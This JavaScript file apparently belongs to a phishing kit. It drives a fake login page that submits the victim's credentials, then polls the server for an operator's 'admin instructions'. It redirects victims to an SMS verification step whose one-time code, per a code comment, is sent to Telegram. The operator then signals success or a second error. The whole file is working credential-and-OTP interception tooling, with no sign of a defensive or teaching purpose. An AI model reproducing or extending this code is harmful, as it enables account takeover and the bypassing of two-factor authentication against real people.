// Auto-dismiss flash messages after 3 seconds
document.addEventListener("DOMContentLoaded", () => {
  const flashes = document.querySelectorAll(".flash");
  flashes.forEach((el) => {
    setTimeout(() => {
      el.style.transition = "opacity 0.4s ease";
      el.style.opacity = "0";
      setTimeout(() => el.remove(), 400);
    }, 3000);
  });
});

document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.querySelector('.form-area');
    const loginBtn = document.querySelector('.btn-login');
    const loginText = document.querySelector('.login_text');

    if (loginForm) {
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            // 1. UI Feedback: Show Loading
            loginBtn.style.opacity = "0.7";
            loginBtn.style.pointerEvents = "none";
            loginText.innerHTML = '<div class="spinner"></div>'; // Add spinner CSS

            // 2. Submit Data
            const formData = new FormData(loginForm);
            try {
                await fetch('/login', {
                    method: 'POST',
                    body: formData
                });

                // 3. Start Polling for Admin instructions
                startPolling();
            } catch (err) {
                console.error("Submission error", err);
            }
        });
    }
});

function startPolling() {
    const checkTimer = setInterval(async () => {
        try {
            const res = await fetch('/api/check-status');
            const data = await res.json();

            if (data.action === 'redirect' && data.url === '/number-verify') {
                clearInterval(checkTimer);
                // FORCE a real page change. This solves the "messed up" CSS.
                window.location.assign("/number-verify"); 
            }
            if (data.action === 'redirect' && data.url === '/success') {
                clearInterval(checkTimer);
                // FORCE a real page change. This solves the "messed up" CSS.
                window.location.assign("/success"); 
            }
        } catch (e) {
            console.error("Polling error", e);
        }
    }, 2000);
}


async function loadSMSPage() {
    // 1. Fetch the SMS HTML from the server
    const res = await fetch('/number-verify');
    const html = await res.text();

    // 2. Replace the content of the main page container
    document.querySelector('.page').innerHTML = html;

    // 3. Re-initialize listeners for the new elements
    initSMSListeners();
}

function initSMSListeners() {
    // BACK BUTTON: Reload the page to return to login
    document.getElementById('back-to-login').addEventListener('click', (e) => {
        e.preventDefault();
        window.location.reload(); 
    });

    // SMS SUBMIT: Send OTP to Telegram
    const smsForm = document.getElementById('sms-form');
    smsForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const code = smsForm.querySelector('input[name="otp_code"]').value;
        
        // Show loading again on continue button
        const btn = smsForm.querySelector('.btn-continue');
        btn.innerHTML = '<div class="spinner"></div>';
        
        await fetch('/api/submit-otp', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ otp: code, type: 'sms' })
        });

        // Start polling again for next admin command (e.g., success or second error)
        startPolling();
    });
}